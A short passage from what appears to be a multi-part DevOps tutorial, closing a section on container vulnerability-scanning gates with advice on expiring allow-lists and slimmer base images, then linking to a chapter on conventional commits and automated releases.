- Add an explicit, documented allow-list for accepted findings, with an expiry date.
- Make a smaller base image the actual fix — `-slim` or distroless has far less surface than a full
  distribution image.

The goal is a gate people trust and keep, not a gate they route around.
:::

---

Continue with: [5. Conventional commits and automated releases](05-releases.md).
